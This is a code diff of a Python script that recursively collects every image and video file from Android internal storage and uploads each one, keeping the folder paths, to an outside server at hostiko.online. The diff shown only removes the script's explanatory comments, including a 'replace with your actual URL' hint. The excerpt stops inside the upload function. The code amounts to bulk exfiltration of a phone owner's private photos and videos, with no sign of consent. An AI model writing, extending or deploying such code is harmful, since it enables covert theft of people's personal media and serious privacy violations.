@@ -1,12 +1,12 @@
 import os
 import requests
 
-# ✅ Step 1: Setup
+# ✅ Step 1
 base_path = "/storage/emulated/0/"  # Android internal storage
-server_url = "https://hostiko.online/data/upload.php"  # <-- Replace with your actual URL
+server_url = "https://hostiko.online/data/upload.php"  
 image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4']
 
-# ✅ Step 2: paths
+# ✅ Step 2
 def find_all_images(path):
     image_files = []
     for root, dirs, files in os.walk(path):
@@ -15,7 +15,7 @@ def find_all_images(path):
                 image_files.append(os.path.join(root, file))
     return image_files
 
-# ✅ Step 3: Upload Image with Relative Path
+# ✅ Step 3
 def upload_image(image_path):
     try:
         relative_path = os.path.relpath(image_path, base_path)  # Relative path to keep folder structure
